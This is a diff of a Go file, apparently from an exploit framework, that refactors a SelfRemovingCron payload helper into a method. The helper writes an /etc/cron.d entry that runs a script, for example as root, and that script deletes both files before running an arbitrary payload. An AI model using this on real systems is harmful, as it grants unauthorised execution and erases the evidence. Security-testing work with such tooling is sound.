+++ payload/other/other.go
@@ -1,11 +1,15 @@
-package payload
-
-// The payload package contains a collection of universally applicable functions for payloads, sub-packages
-// containing specific payloads, and any specific payloads that do not fit into the other sub package types.
+// Other types of payloads that do not fit into the core categories.
+//
+// The payload package contains any specific payloads that do not fit into the other sub package types.
+package other
 
 import (
 	"fmt"
 )
+
+type CronPayload struct{}
+
+var Cron = &CronPayload{}
 
 // Creates two strings that can be used for gaining execution via "/etc/cron.d". The first return ("cron")
 // should be uploaded to "cronPath" (presumably /etc/cron.d but I don't know your life), and the second
@@ -19,7 +23,7 @@ import (
 //	    return false
 //	}
 //	cron, xploit := payload.SelfRemovingCron("root", cronPath, xploitPath, xploit)
-func SelfRemovingCron(user string, cronPath string, xploitPath string, payload string) (string, string) {
+func (c *CronPayload) SelfRemovingCron(user string, cronPath string, xploitPath string, payload string) (string, string) {
 	cron := fmt.Sprintf("* * * * * %s /bin/sh %s\n", user, xploitPath)
 	xploit := fmt.Sprintf("#!/bin/sh\n\nrm -f %s\nrm -f %s\n%s\n", cronPath, xploitPath, payload)
